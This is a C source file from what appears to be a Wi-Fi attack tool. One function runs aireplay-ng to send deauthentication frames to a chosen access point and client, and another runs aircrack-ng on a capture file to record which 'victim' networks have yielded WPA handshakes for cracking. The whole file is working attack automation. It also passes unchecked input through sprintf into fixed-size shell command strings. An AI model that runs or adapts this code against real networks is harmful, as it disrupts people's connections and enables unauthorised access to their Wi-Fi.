#include "collection.h"

extern char* wireless_device;

void runDeauth(char* ap_bssid, char* client_bssid){
    char command[100] = ""; 
    sprintf(command, "aireplay-ng --deauth 10 -a %s -c %s %s", ap_bssid, client_bssid, wireless_device);
    
    printf("Attacking AP %s using client %s\n", ap_bssid, client_bssid);
    int status = 0;
    pid_t pid = fork();
    if (pid == 0){
        //hide output of scanning
        int dev_null = open("/dev/null", O_WRONLY);
        dup2(dev_null, 1);
        dup2(dev_null, 2);
        close(dev_null);

        //run scanning TODO: check if not running sudo
        execl("/bin/bash", "sh", "-c", command, NULL);
        printf("error runnnig deauth\n");
        kill(getppid(), SIGUSR1);
        exit(1);
    }
    //wait for child to finish
    wait(&status);
}
void checkKey(AP* victim_APs, int num_victims, char* filename){
    //APs that may have been attacked on this channel
    //aircrack command variables
    char command[100] = ""; 
    FILE* commands;
    int line_length = 0;
    size_t buffer_sz = 255*sizeof(char);
    char* buffer = malloc(buffer_sz);

    //run aircrack command and store output
    sprintf(command, "echo \"0\" | aircrack-ng %s 2> /dev/null", filename);
    commands = popen(command, "r");
    printf("Checking for handshakes...\n");
    if(commands == NULL){
        printf("ERROR RUNNING AIRCRACK-NG\n");
        exit(1);
    }
    
    //Setup regular expression for BSSIDs
    regex_t isBSSID;
    if(regcomp(&isBSSID, "[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}", REG_EXTENDED))
        printf("compilation of regex failed!\n");
    
    //parse aircrack output to see which APs have handshakes captured
    while( (line_length = getline(&buffer, &buffer_sz, commands)) != -1){
        char station_BSSID[19] = "";
        int num_handshakes = 0;
        //tokenize line to parse individual fields
        char* token = strtok(buffer," ");
        do{
            //if regex matches BSSID format, then is BSSID
            if(!regexec(&isBSSID, token, 0, NULL, 0)){
                //save BSSID in case of handshake
                memcpy(station_BSSID, token, 18);
            }
            //if WPA encryption detected, grab remaining tokens to be processed for potential handshake
            if(strcmp(token, "WPA") == 0){
                token = strtok(NULL,"\n");
                break;
            }
            //keep parsing
        }while( (token = strtok(NULL, " ")) != NULL );

        //process potential handshake
        if(token != NULL){
            sscanf(token, "(%d handshake)", &num_handshakes);
            //if no handshakes found process next line
            if(num_handshakes == 0) continue;
            //if handshake found update AP entry to stop intrusive attacks
            struct BSSID victim;
            PACK_BSSID(station_BSSID, &victim);
            //find AP with corresponding BSSID
            for(int i = 0; i < num_victims; i++){
                if(memcmp(&victim_APs[i], &victim, sizeof(struct BSSID)) == 0){
                    victim_APs[i].keyCaptured = true;
                    printf("Successful handshake collected from %s\n", station_BSSID);
                    break;
                }
            }
        }
    }
    
    free(buffer);
    pclose(commands);
}